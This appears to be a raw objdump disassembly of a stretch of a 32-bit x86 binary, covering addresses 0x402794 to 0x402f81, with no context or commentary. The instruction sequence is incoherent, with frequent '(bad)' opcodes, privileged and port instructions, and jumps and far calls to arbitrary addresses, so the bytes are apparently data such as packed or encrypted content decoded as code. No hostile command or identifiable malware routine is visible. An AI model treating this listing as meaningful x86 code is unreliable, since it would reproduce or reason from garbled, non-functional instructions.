  402794:	cld    
  402795:	sbb    DWORD PTR [ecx-0x2e005fad],edi
  40279b:	lea    esi,[edi]
  40279d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40279e:	ss sub al,al
  4027a1:	dec    ebx
  4027a2:	(bad)  
  4027a3:	fsubr  DWORD PTR [esi+eax*2-0x10]
  4027a7:	icebp  
  4027a8:	lahf   
  4027a9:	call   0x57957c08
  4027ae:	push   esi
  4027af:	push   ebx
  4027b0:	inc    ecx
  4027b1:	pop    es
  4027b2:	or     ebp,esi
  4027b4:	bound  ebp,QWORD PTR [edi+eax*4+0x6c]
  4027b8:	mov    dl,0x25
  4027ba:	pusha  
  4027bb:	pop    edi
  4027bc:	xor    bh,al
  4027be:	inc    eax
  4027bf:	cmp    edi,DWORD PTR [ebx+0x36]
  4027c2:	sti    
  4027c3:	dec    edi
  4027c4:	fisttp WORD PTR [ebp-0x6a76f57b]
  4027ca:	inc    edx
  4027cb:	mov    dl,0x7b
  4027cd:	aaa    
  4027ce:	dec    ebp
  4027cf:	js     0x402831
  4027d1:	add    al,0xfd
  4027d3:	lahf   
  4027d4:	rol    BYTE PTR [edx+0x8],cl
  4027d7:	call   0xc32a9778
  4027dc:	inc    esi
  4027dd:	jmp    0x14a815f6
  4027e2:	or     al,0x10
  4027e4:	pop    ecx
  4027e5:	cmp    DWORD PTR [ecx],0x7a543996
  4027eb:	arpl   WORD PTR [eax-0x3d],cx
  4027ee:	push   ebp
  4027ef:	(bad)  
  4027f0:	sub    al,0x39
  4027f2:	pop    edx
  4027f3:	mov    esp,DWORD PTR [esp+0x2c]
  4027f7:	lea    edi,[edx+0x6ff82bde]
  4027fd:	pop    ebp
  4027fe:	inc    esi
  4027ff:	enter  0xe2ff,0xc3
  402803:	xor    esi,esp
  402805:	jmp    0xe71be416
  40280a:	retf   
  40280b:	sbb    DWORD PTR [edx],eax
  40280d:	leave  
  40280e:	ret    0xc30c
  402811:	das    
  402812:	mov    edi,0xccb5bc44
  402817:	pop    ss
  402818:	add    bh,BYTE PTR ds:0x2c7f5292
  40281e:	je     0x40287c
  402820:	cmp    eax,0xbfe66e1e
  402825:	mov    cs,WORD PTR [eax]
  402827:	adc    eax,0x52d5774
  40282c:	cvtps2pi mm0,QWORD PTR [edi+0x5feb3d12]
  402833:	cli    
  402834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402835:	scas   eax,DWORD PTR es:[edi]
  402836:	dec    esi
  402837:	jmp    0x402899
  402839:	add    eax,0x833ff971
  40283e:	call   0x74769a45
  402843:	aad    0x6d
  402845:	jnp    0x402845
  402847:	jnp    0x40289b
  402849:	cmp    eax,0x74112996
  40284e:	cmp    eax,0x222e932d
  402853:	adc    eax,DWORD PTR [edx]
  402855:	sar    edi,1
  402857:	in     eax,dx
  402858:	sti    
  402859:	and    al,0xeb
  40285b:	cmp    ch,BYTE PTR ds:0x272f0efd
  402861:	cmp    eax,0x2ceb2674
  402866:	mov    al,0xc8
  402868:	jmp    0x402894
  40286a:	mov    al,0x56
  40286c:	jg     0x402865
  40286e:	mov    edi,0xcdb02678
  402873:	jmp    0x402897
  402875:	mov    al,0xcf
  402877:	jmp    0x402897
  402879:	bndldx (bad),[eax-0x4fe91429]
  402880:	into   
  402881:	or     DWORD PTR [edx-0x4f2a402c],edi
  402887:	test   DWORD PTR [esi],ecx
  402889:	mov    al,0xda
  40288b:	jmp    0x402897
  40288d:	mov    al,0xd9
  40288f:	arpl   WORD PTR [eax+0xb7e03ca],si
  402895:	or     eax,0xc8ff30f6
  40289a:	push   edx
  40289b:	or     al,0x34
  40289d:	sub    BYTE PTR [ecx+0x14],ah
  4028a0:	loopne 0x4028ff
  4028a2:	mov    bh,0xc7
  4028a4:	cmp    al,al
  4028a6:	popa   
  4028a7:	sbb    BYTE PTR [ebx],al
  4028a9:	inc    edx
  4028aa:	seto   BYTE PTR ds:0x3fc3de33
  4028b1:	je     0x402924
  4028b3:	sub    ch,dl
  4028b5:	xor    eax,0x90e3a908
  4028ba:	daa    
  4028bb:	sub    DWORD PTR [esi],edx
  4028bd:	pop    esp
  4028be:	int3   
  4028bf:	cmp    eax,DWORD PTR [eax]
  4028c1:	mov    WORD PTR [esi],es
  4028c3:	pop    ss
  4028c4:	sbb    BYTE PTR [ebx-0x20],dl
  4028c7:	inc    ebx
  4028c8:	sbb    BYTE PTR [edx-0x72f97306],bl
  4028ce:	mov    edx,0xfc6ed2fa
  4028d3:	dec    esp
  4028d4:	hlt    
  4028d5:	imul   ebp,esi,0xffffffee
  4028d8:	or     esp,DWORD PTR [ecx]
  4028da:	jge    0x402901
  4028dc:	in     al,0x61
  4028de:	sbb    DWORD PTR ds:[ebp+eax*1-0x5],ecx
  4028e3:	retf   
  4028e4:	sub    ecx,DWORD PTR [eax+edi*4]
  4028e7:	fnstcw WORD PTR [edx-0x80]
  4028ea:	push   esi
  4028eb:	std    
  4028ec:	call   0x2c31:0x5c7d1451
  4028f3:	mov    ah,0x70
  4028f5:	(bad)  
  4028f8:	dec    ecx
  4028f9:	mov    eax,ds:0x508c4b0a
  4028fe:	xor    BYTE PTR [edx+0x6e],dl
  402901:	in     al,0x28
  402903:	punpckhbw mm2,mm7
  402906:	cmp    ebp,DWORD PTR [ebx-0x78]
  402909:	or     BYTE PTR [esp+esi*1-0x3ef55ee1],bl
  402910:	or     ebp,DWORD PTR [esi+0x251c5d81]
  402916:	cmp    eax,ecx
  402918:	fild   DWORD PTR [eax]
  40291a:	sub    edi,DWORD PTR [ecx+0x9]
  40291d:	sub    eax,0x83c0bf13
  402922:	stc    
  402923:	cdq    
  402924:	or     BYTE PTR [ecx],bh
  402926:	add    DWORD PTR [ebp-0xb],esi
  402929:	stc    
  40292a:	stos   BYTE PTR es:[edi],al
  40292b:	out    dx,al
  40292c:	fimul  WORD PTR [ebp+0x6]
  40292f:	mov    bh,0xbe
  402931:	xor    BYTE PTR cs:[ebx+0x54310846],cl
  402938:	mov    ebx,DWORD PTR [esi+0xf]
  40293b:	and    dl,BYTE PTR [eax+0x2b]
  40293e:	xor    al,0xa
  402940:	shl    eax,0xde
  402943:	or     cl,0x2a
  402946:	or     eax,0x894b1b3b
  40294b:	sbb    edi,DWORD PTR [eax-0x7f]
  40294e:	sub    esi,DWORD PTR [esi-0x6e]
  402951:	inc    esp
  402952:	fcom   DWORD PTR [ebx+eiz*4+0x141adc18]
  402959:	push   esp
  40295a:	xchg   ebp,eax
  40295b:	sbb    bh,BYTE PTR [edi-0x1b]
  40295e:	mov    ah,BYTE PTR [ebx+eax*1+0x11]
  402962:	js     0x40294f
  402964:	adc    al,0x43
  402966:	das    
  402967:	sub    DWORD PTR [ecx+edi*4+0x45f066c],esi
  40296e:	in     al,0x89
  402970:	outs   dx,DWORD PTR ds:[esi]
  402971:	mov    edi,0x19389584
  402976:	inc    edi
  402977:	xor    BYTE PTR ds:0xfbf77b70,dh
  40297d:	leave  
  40297e:	jge    0x4029bb
  402980:	repz jle 0x40299d
  402983:	ins    BYTE PTR es:[edi],dx
  402984:	add    al,0xd8
  402986:	imul   eax,DWORD PTR [ebx-0x77],0x5f
  40298a:	or     al,0x6f
  40298c:	mov    al,BYTE PTR [eax+ecx*8]
  40298f:	daa    
  402990:	cmp    esi,ebx
  402992:	jg     0x40297a
  402994:	sbb    DWORD PTR [ebx],ebp
  402996:	mov    ecx,0x785023ea
  40299b:	sbb    DWORD PTR [ecx],ecx
  40299d:	sbb    BYTE PTR [eax],al
  40299f:	and    ebx,DWORD PTR [ebx]
  4029a1:	mov    cl,0x70
  4029a3:	mov    ds:0xdf3c38c8,eax
  4029a8:	scas   al,BYTE PTR es:[edi]
  4029a9:	inc    eax
  4029aa:	cmp    al,0xdc
  4029ac:	inc    eax
  4029ad:	(bad)  
  4029ae:	or     eax,0x6c432c50
  4029b3:	dec    ebx
  4029b4:	scas   al,BYTE PTR es:[edi]
  4029b5:	aas    
  4029b6:	mov    esi,0xe93428c6
  4029bb:	sub    ah,BYTE PTR [ebx+eax*8]
  4029be:	pop    ss
  4029bf:	pop    ebp
  4029c0:	mov    esi,edi
  4029c2:	(bad)  
  4029c3:	inc    esp
  4029c4:	cld    
  4029c5:	cmp    al,0x18
  4029c7:	lea    esi,[eax+ebx*1+0x4]
  4029cb:	inc    ebp
  4029cc:	push   ss
  4029cd:	mov    WORD PTR [eax],ds
  4029cf:	add    edx,ebx
  4029d1:	sbb    eax,DWORD PTR [ebx+0x4740bd5b]
  4029d7:	mov    al,dh
  4029d9:	or     BYTE PTR [edi-0x76],cl
  4029dc:	pop    esi
  4029dd:	pop    edi
  4029de:	mul    DWORD PTR [ecx+0x271601c2]
  4029e4:	add    ecx,DWORD PTR [ebp+0x5b]
  4029e7:	lahf   
  4029e8:	jo     0x402980
  4029ea:	ins    DWORD PTR es:[edi],dx
  4029eb:	sbb    ah,BYTE PTR [esi]
  4029ed:	or     al,0xec
  4029ef:	gs inc eax
  4029f1:	push   0xdc0968b1
  4029f6:	adc    ch,BYTE PTR [edi+0x1d]
  4029f9:	pop    es
  4029fa:	xchg   BYTE PTR [edi+0x1bf05bed],bh
  402a00:	addr16 cdq 
  402a02:	idiv   edi
  402a04:	add    dl,0x30
  402a07:	adc    al,0xc1
  402a09:	mov    BYTE PTR [esi+eax*1],dl
  402a0c:	adc    esi,DWORD PTR [edi]
  402a0e:	push   0xffffff83
  402a10:	xchg   ebx,eax
  402a11:	mov    ebx,0x484958fb
  402a16:	(bad)  [ecx-0x5e24ff45]
  402a1c:	sbb    al,0xf9
  402a1e:	push   eax
  402a1f:	shl    BYTE PTR [eax],1
  402a21:	mov    dl,BYTE PTR [edx+0x76c02c0a]
  402a27:	mov    eax,ds:0xd98a2b88
  402a2c:	sub    DWORD PTR [esi],ebx
  402a2e:	pop    ds
  402a2f:	dec    ecx
  402a30:	ja     0x402a95
  402a32:	push   ss
  402a33:	dec    ebp
  402a34:	sbb    ah,dh
  402a36:	iret   
  402a37:	adc    eax,0xf6530587
  402a3c:	sbb    esp,DWORD PTR [edi]
  402a3e:	cld    
  402a3f:	neg    eax
  402a41:	sbb    eax,eax
  402a43:	inc    eax
  402a44:	pop    ebx
  402a45:	pop    edi
  402a46:	jle    0x402ab7
  402a48:	adc    al,0xff
  402a4a:	ja     0x402a68
  402a4c:	add    dh,BYTE PTR [esi+0x22a3740d]
  402a52:	aaa    
  402a53:	mov    ecx,0x2ca5f326
  402a58:	leave  
  402a59:	pop    eax
  402a5a:	clc    
  402a5b:	mov    BYTE PTR [ebx+0x4433517f],dl
  402a61:	dec    ebp
  402a62:	push   edi
  402a63:	sub    eax,DWORD PTR [ecx+0x13]
  402a66:	xchg   esp,eax
  402a67:	cmp    BYTE PTR [eax+ebx*1-0x1f672ec0],cl
  402a6e:	add    bl,BYTE PTR [edi+0x9]
  402a71:	and    BYTE PTR [edx+0xb],ch
  402a74:	mov    eax,0x3463df9e
  402a79:	jle    0x402a3d
  402a7b:	push   edx
  402a7c:	xor    cl,dl
  402a7e:	lock push 0x1e
  402a81:	push   0x6c396aba
  402a86:	mov    WORD PTR [edi-0xa3060b],cs
  402a8c:	jl     0x402aa8
  402a8e:	add    cl,BYTE PTR [edx+0x790906]
  402a94:	sub    al,0x38
  402a96:	sub    BYTE PTR [ebp+0x2c6cad7d],bl
  402a9c:	inc    eax
  402a9d:	sub    al,0x25
  402a9f:	cmp    DWORD PTR [eax+0x3e],esp
  402aa2:	add    BYTE PTR [edx],cl
  402aa4:	pop    esp
  402aa5:	xor    edx,0xf4941d
  402aab:	mov    ebx,0xdc6b97ef
  402ab0:	or     eax,0xbb51eced
  402ab5:	mov    bl,0xbe
  402ab7:	xchg   ebx,eax
  402ab8:	inc    eax
  402ab9:	sbb    BYTE PTR [esi*1+0x287bdbd0],0x36
  402ac1:	push   ss
  402ac2:	cmp    DWORD PTR [esi],0xfffffff2
  402ac5:	push   es
  402ac6:	pushf  
  402ac7:	imul   ebp,DWORD PTR [eax+0x63886c6],0xffffffff
  402ace:	cld    
  402acf:	jmp    0xc735:0xdbe1a1ef
  402ad6:	in     al,dx
  402ad7:	sbb    DWORD PTR [edi+0x2b],eax
  402ada:	and    BYTE PTR [esp+ebp*4],al
  402add:	enter  0xc54c,0xee
  402ae1:	fcom   QWORD PTR [ebx]
  402ae3:	xor    eax,0x1f0e7502
  402ae8:	scas   al,BYTE PTR es:[edi]
  402ae9:	mov    ecx,0xc923b18b
  402aee:	inc    ebx
  402aef:	or     al,0x12
  402af1:	sbb    BYTE PTR [ecx],al
  402af3:	jbe    0x402afe
  402af5:	call   0xa171325c
  402afa:	jnp    0x402b0c
  402afc:	call   0x7201:0xd46c281c
  402b03:	pop    esp
  402b04:	imul   ecx,DWORD PTR [ebx-0x4874ae09],0xfffffffe
  402b0b:	cmp    esi,DWORD PTR [ebp+0x4]
  402b0e:	mov    al,ds:0x5e9e562b
  402b13:	or     edi,DWORD PTR [esi]
  402b15:	fild   QWORD PTR [esi+esi*1+0x4503758c]
  402b1c:	mov    ss,eax
  402b1e:	push   eax
  402b1f:	jl     0x402b4e
  402b21:	dec    esp
  402b22:	push   0x7c
  402b24:	out    dx,eax
  402b25:	sbb    ah,BYTE PTR [ebx-0x11]
  402b28:	and    BYTE PTR [edi-0xb],bl
  402b2b:	and    al,0x24
  402b2d:	mov    eax,ds:0x108cf457
  402b32:	mov    dh,0x82
  402b34:	inc    edx
  402b35:	adc    ecx,DWORD PTR [eax+0x2c5e69fb]
  402b3b:	bound  eax,QWORD PTR [edi-0x6d]
  402b3e:	sub    al,0x7d
  402b40:	mov    ds,WORD PTR [edi-0xf5dab90]
  402b46:	clc    
  402b47:	and    ebx,DWORD PTR [ebx-0xb]
  402b4a:	pusha  
  402b4b:	fstp   DWORD PTR [esi-0x74161c73]
  402b51:	mov    edx,edx
  402b53:	mov    DWORD PTR [eax-0x5],0xfa573c0b
  402b5a:	clc    
  402b5b:	dec    ecx
  402b5c:	jl     0x402b6e
  402b5e:	lock inc DWORD PTR [esi]
  402b61:	retf   0xdd48
  402b64:	mov    al,ds:0xf842a4db
  402b69:	inc    ebx
  402b6a:	pop    eax
  402b6b:	jb     0x402b24
  402b6d:	push   eax
  402b6e:	mov    WORD PTR [edi+0x1a29136d],fs
  402b74:	mov    DWORD PTR [ebx],0x4c8d868e
  402b7a:	push   cs
  402b7b:	or     BYTE PTR [eax],ch
  402b7d:	in     eax,dx
  402b7e:	out    dx,al
  402b7f:	push   ds
  402b80:	mov    ecx,0xda754ee2
  402b85:	scas   eax,DWORD PTR es:[edi]
  402b86:	aas    
  402b87:	and    DWORD PTR [ecx+0x7f],eax
  402b8a:	sbb    dh,BYTE PTR [esi-0x7bd1503c]
  402b90:	inc    edx
  402b91:	cwde   
  402b92:	sub    eax,0xb580ff4
  402b97:	mov    ch,0x1b
  402b99:	mov    esp,0x44fc48e2
  402b9e:	out    dx,eax
  402b9f:	jmp    0x402ba5
  402ba1:	cmp    eax,esi
  402ba3:	push   es
  402ba4:	fdiv   DWORD PTR [edi+0x147b8736]
  402baa:	dec    ebx
  402bab:	inc    ebx
  402bac:	or     bh,dh
  402bae:	lds    ebp,FWORD PTR [eax]
  402bb0:	jnp    0x402c30
  402bb2:	sub    DWORD PTR [ebx-0x40],esi
  402bb5:	jle    0x402bdb
  402bb7:	push   eax
  402bb8:	clc    
  402bb9:	mov    cl,0xfa
  402bbb:	lea    ebp,[esi]
  402bbd:	or     al,BYTE PTR [ebx+0x1550fee0]
  402bc3:	pop    edx
  402bc4:	mov    WORD PTR [edx+eax*1-0x50],0x5bf5
  402bcb:	mov    esi,DWORD PTR [ecx-0x76a5f7ed]
  402bd1:	push   eax
  402bd2:	cld    
  402bd3:	call   0x3a62:0xb843bbf8
  402bda:	mov    ch,0x47
  402bdc:	int3   
  402bdd:	mov    edi,ecx
  402bdf:	in     al,dx
  402be0:	(bad)  
  402be1:	lock (bad) [ecx-0x76066808]
  402be8:	(bad)  
  402be9:	jne    0x402bf4
  402beb:	lahf   
  402bec:	mov    eax,esi
  402bee:	pushf  
  402bef:	(bad)  
  402bf0:	adc    ch,BYTE PTR [edi-0x40e8f1c0]
  402bf6:	cmp    edx,ebx
  402bf8:	fdivr  st,st(2)
  402bfa:	nop
  402bfb:	imul   ebp,DWORD PTR [ebx],0x33
  402bfe:	push   edx
  402bff:	push   eax
  402c00:	add    ecx,DWORD PTR [eax]
  402c02:	add    DWORD PTR [edx+0x8ef95a8],ebx
  402c08:	leave  
  402c09:	mov    eax,0x700cc016
  402c0e:	loopne 0x402c4c
  402c10:	mov    ds:0xfbad1b8b,al
  402c15:	adc    DWORD PTR [ecx],ebx
  402c17:	adc    al,0x53
  402c19:	add    esp,0xdc9dffc0
  402c1f:	sbb    al,BYTE PTR [edx-0xebe3b53]
  402c25:	mov    ebx,0x97f6cf8
  402c2a:	mov    bh,0xe0
  402c2c:	mov    edi,0xeb63f83b
  402c31:	pop    edi
  402c32:	lea    ebp,[esi+0x1]
  402c35:	cmp    ebp,0x289307ff
  402c3b:	push   esi
  402c3c:	push   cs
  402c3d:	loop   0x402bc0
  402c3f:	pop    ss
  402c40:	adc    eax,0xff2ba6b
  402c45:	lds    ecx,FWORD PTR [edi+0x502e1f76]
  402c4b:	out    0x7c,eax
  402c4d:	(bad)  
  402c4f:	(bad)  
  402c50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c51:	sti    
  402c52:	push   es
  402c53:	fisttp WORD PTR [ebx+0x532012cb]
  402c59:	mov    ebx,ebp
  402c5b:	add    ebx,ebx
  402c5d:	push   cs
  402c5e:	rcr    DWORD PTR [edi+0x32d2dec5],cl
  402c64:	pushf  
  402c65:	in     eax,dx
  402c66:	pop    es
  402c67:	xor    cl,BYTE PTR ds:0x33027d2f
  402c6d:	test   BYTE PTR [edx-0x47],dl
  402c70:	gs push ds
  402c72:	jl     0x402cd6
  402c74:	jmp    DWORD PTR [eax]
  402c76:	jbe    0x402c50
  402c78:	push   0x52
  402c7a:	test   al,0xb9
  402c7c:	add    al,0x45
  402c7e:	pop    esi
  402c7f:	call   0x31a74391
  402c84:	leave  
  402c85:	push   ecx
  402c86:	and    DWORD PTR [edx+0x3a],edx
  402c89:	or     bh,cl
  402c8b:	cmp    cl,BYTE PTR [edx+0x1]
  402c8e:	mov    dh,0xb1
  402c90:	mov    esp,0x204cb35
  402c95:	je     0x402ca2
  402c97:	add    esp,DWORD PTR [ebp-0x7d]
  402c9a:	mov    edx,0xf6fef0ec
  402c9f:	jmp    0x402c89
  402ca1:	inc    edx
  402ca2:	add    BYTE PTR [ecx-0x2ed6a52f],cl
  402ca8:	jmp    0xee6f8fdb
  402cad:	mov    edx,0x522d7db6
  402cb2:	cmp    si,WORD PTR [eax]
  402cb5:	and    BYTE PTR [esp+ebp*1],al
  402cb8:	pop    ss
  402cb9:	add    eax,0xd80e7404
  402cbe:	ins    BYTE PTR es:[edi],dx
  402cbf:	sti    
  402cc0:	imul   eax,DWORD PTR [esi],0x33
  402cc3:	or     bl,ch
  402cc5:	in     al,0x4
  402cc7:	add    al,BYTE PTR [edx]
  402cc9:	cmp    DWORD PTR [esi+0x3ab5f27d],ebx
  402ccf:	cmp    ecx,DWORD PTR [edx+ecx*4-0x6fb6bdf6]
  402cd6:	push   edi
  402cd7:	fimul  DWORD PTR [eax-0x76d7e8f5]
  402cdd:	xlat   BYTE PTR ds:[ebx]
  402cde:	mov    dl,dh
  402ce0:	scas   al,BYTE PTR es:[edi]
  402ce1:	or     al,0xd1
  402ce3:	or     esp,DWORD PTR [ebx-0x4d]
  402ce6:	xchg   edi,eax
  402ce7:	test   ecx,eax
  402ce9:	pop    eax
  402cea:	pop    edi
  402ceb:	sbb    BYTE PTR [edi+0x5],bl
  402cee:	loope  0x402cec
  402cf0:	mov    ebp,0x37602061
  402cf5:	xchg   esi,eax
  402cf6:	int    0x40
  402cf8:	cld    
  402cf9:	ret    
  402cfa:	retf   0xc0d
  402cfd:	aam    0x19
  402cff:	aas    
  402d00:	out    0xa3,eax
  402d02:	mov    ds:0x70be85fd,al
  402d07:	adc    cl,al
  402d09:	mov    edi,DWORD PTR [ecx+0x51]
  402d0c:	push   esi
  402d0d:	cld    
  402d0e:	add    edx,edi
  402d10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d11:	ins    DWORD PTR es:[edi],dx
  402d12:	mov    ebx,0xec8a6b10
  402d17:	mov    edi,0x13124e8b
  402d1c:	adc    DWORD PTR [ebx-0x39f74278],ebp
  402d22:	repz push ss
  402d24:	ins    BYTE PTR es:[edi],dx
  402d25:	(bad)  {k5}
  402d2a:	iret   
  402d2b:	inc    ebx
  402d2c:	popa   
  402d2d:	inc    ecx
  402d2e:	pusha  
  402d2f:	cmp    edx,DWORD PTR [eax]
  402d31:	xchg   ebp,eax
  402d32:	sbb    eax,0x3bda5dad
  402d37:	or     BYTE PTR [ebx-0x7bd27176],bh
  402d3d:	or     bl,BYTE PTR [eax+edi*8-0x25]
  402d41:	jno    0x402d72
  402d43:	aam    0x57
  402d45:	ror    DWORD PTR [ecx-0x3bcba32],cl
  402d4b:	xor    al,0xb1
  402d4d:	xchg   esp,eax
  402d4e:	arpl   WORD PTR [eax],si
  402d50:	mov    ah,0xc7
  402d52:	push   ss
  402d53:	pop    ebx
  402d54:	dec    ebx
  402d55:	push   0x67
  402d57:	(bad)  
  402d58:	sahf   
  402d59:	mov    dh,0x89
  402d5b:	cli    
  402d5c:	bound  eax,QWORD PTR [ebx]
  402d5e:	push   ebx
  402d5f:	push   cs
  402d60:	pop    eax
  402d61:	maskmovq mm2,(bad)
  402d62:	not    DWORD PTR [edi]
  402d64:	mov    ebx,0x4f9dc464
  402d69:	clc    
  402d6a:	inc    ebp
  402d6b:	jo     0x402cf6
  402d6d:	retf   0x50e9
  402d70:	pop    ebx
  402d71:	jecxz  0x402db3
  402d73:	in     al,0x89
  402d75:	retf   0x1b6b
  402d78:	push   ebx
  402d79:	xor    DWORD PTR [eax-0x7a3b26],edi
  402d7f:	mov    ds:0xc4c1494,eax
  402d84:	cmp    esi,ebx
  402d86:	test   DWORD PTR [edx],edx
  402d88:	pop    ss
  402d89:	push   0x79
  402d8b:	cmp    ah,0x4a
  402d8e:	out    dx,eax
  402d8f:	add    esi,DWORD PTR [esi+0x1560edc2]
  402d95:	or     DWORD PTR [ebx],eax
  402d97:	(bad)  
  402d99:	iret   
  402d9a:	push   cs
  402d9b:	es dec edx
  402d9d:	mov    ebx,0xa20575a8
  402da2:	push   ecx
  402da3:	pop    ss
  402da4:	jae    0x402db2
  402da6:	ja     0x402da4
  402da8:	add    DWORD PTR [ebx-0x1],esp
  402dab:	addr16 mov esi,0x37ff243c
  402db1:	add    esi,DWORD PTR [edi]
  402db3:	dec    ebx
  402db4:	jmp    0x402dbe
  402db6:	xchg   ecx,eax
  402db7:	push   eax
  402db8:	mov    cl,0x4d
  402dba:	or     eax,0x9c442fbf
  402dbf:	sbb    BYTE PTR [ecx+0x4f0a1bf2],cl
  402dc5:	add    esi,ecx
  402dc7:	mov    ecx,ebp
  402dc9:	sub    eax,0x754bed15
  402dce:	jmp    0xe64c4d98
  402dd3:	xchg   ecx,eax
  402dd4:	push   cs
  402dd5:	lock mov ebx,0x925a4a93
  402ddb:	pop    eax
  402ddc:	lea    esp,[esp+edx*4]
  402ddf:	jmp    eax
  402de1:	jnp    0x402d6f
  402de3:	mov    al,ds:0xce6c29d5
  402de8:	and    edi,edi
  402dea:	mov    bh,0x5d
  402dec:	inc    edi
  402ded:	repnz push 0xe98b6b6b
  402df3:	mov    edx,DWORD PTR [edi-0x4]
  402df6:	sub    eax,edx
  402df8:	ja     0x402dfc
  402dfa:	add    edx,eax
  402dfc:	push   edx
  402dfd:	neg    bh
  402dff:	loop   0x402dc3
  402e01:	shr    edx,0xd6
  402e04:	mov    esp,DWORD PTR es:[esi]
  402e07:	pop    ds
  402e08:	cmp    ecx,ebx
  402e0a:	jne    0x402e64
  402e0c:	dec    edx
  402e0d:	je     0x402e24
  402e0f:	in     al,dx
  402e10:	mov    ebx,0x4d1ce83
  402e15:	pop    edx
  402e16:	or     al,0x4b
  402e18:	add    di,0x8
  402e1c:	lahf   
  402e1d:	or     ebx,0xffffffd6
  402e20:	(bad)  
  402e22:	stos   DWORD PTR es:[edi],eax
  402e23:	or     al,BYTE PTR [esp+eax*1]
  402e26:	pop    edx
  402e27:	or     DWORD PTR [edi+0x2a46df2c],edi
  402e2d:	and    ch,BYTE PTR [ebx]
  402e2f:	cmp    BYTE PTR [ecx+0x17],al
  402e32:	cmp    ch,bh
  402e34:	jne    0x402e70
  402e36:	cdq    
  402e37:	or     BYTE PTR [ebx+0x6f],dl
  402e3a:	push   es
  402e3b:	adc    BYTE PTR [ecx-0x31e3b41d],al
  402e41:	sbb    eax,0x3805cefb
  402e46:	daa    
  402e47:	add    eax,eax
  402e49:	jmp    0x402e6e
  402e4b:	pusha  
  402e4c:	jmp    0x402e6a
  402e4e:	push   0x6
  402e50:	dec    edx
  402e51:	div    DWORD PTR [edi-0x23]
  402e54:	adc    eax,0x2d10305a
  402e59:	or     al,0xc1
  402e5b:	jmp    0x112bef70
  402e60:	or     eax,0x4c05b02
  402e65:	xchg   ebx,eax
  402e66:	imul   esp,esp,0xffffff95
  402e69:	mov    eax,0x9d3f0a3b
  402e6e:	jne    0x402ea1
  402e70:	lds    edx,FWORD PTR [edi+0x3274f138]
  402e76:	push   ebx
  402e77:	out    dx,eax
  402e78:	push   cs
  402e79:	imul   eax,ebx,0xffffffb2
  402e7c:	inc    esi
  402e7d:	iret   
  402e7e:	adc    edx,DWORD PTR [eax+0x49]
  402e81:	pop    eax
  402e82:	arpl   dx,si
  402e84:	pushf  
  402e85:	aad    0x8
  402e87:	adc    cl,BYTE PTR [eax+0x40]
  402e8a:	add    esi,DWORD PTR [edi-0x19]
  402e8d:	lods   al,BYTE PTR ds:[esi]
  402e8e:	js     0x402eeb
  402e90:	mov    eax,edx
  402e92:	dec    ebx
  402e93:	xor    DWORD PTR [eax+0x2d],ebx
  402e96:	mov    ebx,DWORD PTR [eax+0x12]
  402e99:	std    
  402e9a:	fild   WORD PTR [eax+0x4a2635fc]
  402ea0:	jl     0x402ebd
  402ea2:	cmp    edx,ebx
  402ea4:	jge    0x402ec5
  402ea6:	sub    ebx,edx
  402ea8:	cmp    eax,DWORD PTR [edx+ebp*2-0x5ee6257b]
  402eaf:	ret    0xf1f7
  402eb2:	or     edi,DWORD PTR [ebp+0x115cd345]
  402eb8:	mov    cl,0xeb
  402eba:	in     eax,0x89
  402ebc:	nop
  402ebd:	jmp    0x402e5c
  402ebf:	mov    DWORD PTR [edx+0x5ba21266],ebx
  402ec5:	ds ds inc eax
  402ec8:	out    dx,eax
  402ec9:	clc    
  402eca:	and    BYTE PTR [ebp+ecx*4+0x31],dh
  402ece:	inc    ebx
  402ecf:	mov    ecx,DWORD PTR [edi-0x4]
  402ed2:	push   edi
  402ed3:	jp     0x402f1f
  402ed5:	js     0x402ef2
  402ed7:	mov    ah,BYTE PTR [edx+0x6c6e3bb]
  402edd:	inc    esi
  402ede:	call   0x110c4361
  402ee3:	mov    ebx,ecx
  402ee5:	sbb    al,0xd1
  402ee7:	mov    eax,ds:0xc5b82bb0
  402eec:	out    0x41,al
  402eee:	in     al,dx
  402eef:	pop    edx
  402ef0:	fbstp  TBYTE PTR [edx+0x572db501]
  402ef6:	jo     0x402f77
  402ef8:	clc    
  402ef9:	cmc    
  402efa:	and    eax,0xf923c2a
  402eff:	mov    ecx,0x6e8dc2e8
  402f04:	fnsave [ebp+0x2356c748]
  402f0a:	cmp    DWORD PTR [eax-0x66],0x75
  402f0e:	sbb    eax,0x85bf5d2e
  402f13:	or     ebx,DWORD PTR [esi-0x3e]
  402f16:	or     ebx,ebx
  402f18:	loopne 0x402ed9
  402f1a:	lock pop eax
  402f1c:	mov    dh,0x89
  402f1e:	sbb    BYTE PTR [ebp+0x43],ch
  402f21:	outs   dx,DWORD PTR ds:[esi]
  402f22:	in     eax,0x70
  402f24:	cld    
  402f25:	(bad)  
  402f26:	cli    
  402f27:	jmp    0x402f51
  402f29:	retf   
  402f2a:	mov    ecx,DWORD PTR [ebx+0x77]
  402f2d:	pop    ebx
  402f2e:	sub    al,0x31
  402f30:	push   0xf139fcfa
  402f35:	jl     0x402f9c
  402f37:	icebp  
  402f38:	aaa    
  402f39:	mov    eax,DWORD PTR [esi]
  402f3b:	pop    eax
  402f3c:	scas   eax,DWORD PTR es:[edi]
  402f3d:	fidiv  WORD PTR [ebx-0x1ddb9784]
  402f43:	adc    BYTE PTR [eax-0x36],dl
  402f46:	dec    esp
  402f47:	fucom  st(4)
  402f49:	(bad)  
  402f4a:	out    dx,eax
  402f4b:	cmp    eax,DWORD PTR [edx]
  402f4d:	scas   eax,DWORD PTR es:[edi]
  402f4e:	or     DWORD PTR [ecx+0x6],0x52
  402f52:	pop    ss
  402f53:	pop    esp
  402f54:	pcmpeqd mm6,QWORD PTR [esi+0x32]
  402f58:	add    bh,bh
  402f5a:	push   cs
  402f5b:	push   eax
  402f5c:	push   ss
  402f5d:	pop    eax
  402f5e:	stos   DWORD PTR es:[edi],eax
  402f5f:	jbe    0x402f63
  402f61:	arpl   WORD PTR [edi-0x56],bp
  402f64:	jb     0x402f72
  402f66:	repz push eax
  402f68:	sbb    al,0x1f
  402f6a:	int    0x46
  402f6c:	and    ch,ah
  402f6e:	call   0x46fc7142
  402f73:	mov    bl,0x45
  402f75:	jb     0x402fce
  402f77:	mov    ch,0xa
  402f79:	mov    cl,0x51
  402f7b:	lock xchg ecx,eax
  402f7d:	sar    BYTE PTR [ecx-0x42],0x72
  402f81:	push   esp
